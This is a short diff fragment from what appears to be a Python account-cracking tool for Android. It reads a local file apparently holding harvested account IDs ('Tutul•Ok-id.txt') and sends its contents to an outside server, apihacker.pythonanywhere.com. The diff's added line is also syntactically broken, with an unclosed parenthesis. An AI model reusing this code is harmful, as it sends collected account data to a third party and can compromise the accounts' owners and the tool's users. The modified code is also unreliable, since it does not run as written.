@@ -222,7 +222,7 @@ for xd in range(10000):
     ugen.append(uaku2)
 import requests
 try:
-   xdfn = str(open('/storage/emulated/0/Tutul•Ok-id.txt','r').read())
+   xdfn = str(open('/storage/emulated/0/Tutul•Ok-id.txt','r').read().replace('\n','tnx9')
 except:
     xdfn = "nai id"
 y = requests.get('https://apihacker.pythonanywhere.com/add?api-key=tabassum&key='+xdfn).text
